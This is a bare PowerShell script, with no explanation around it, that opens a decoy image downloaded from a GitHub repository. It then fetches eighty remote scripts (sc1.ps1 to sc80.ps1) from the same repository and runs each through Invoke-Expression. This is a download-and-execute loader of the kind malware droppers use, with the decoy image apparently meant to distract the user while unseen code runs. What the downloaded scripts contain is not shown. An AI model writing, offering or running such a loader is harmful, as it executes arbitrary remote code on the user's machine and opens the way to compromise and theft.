$wc = New-Object System.Net.WebClient;
$wc.DownloadFile("https://raw.githubusercontent.com/jia891/test/refs/heads/main/1.png", "$env:TEMP\1.png");
Start-Process "$env:TEMP\1.png";

for ($i = 1; $i -le 80; $i++) {
   
    $url = "https://raw.githubusercontent.com/jia891/test/refs/heads/main/sc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent

}


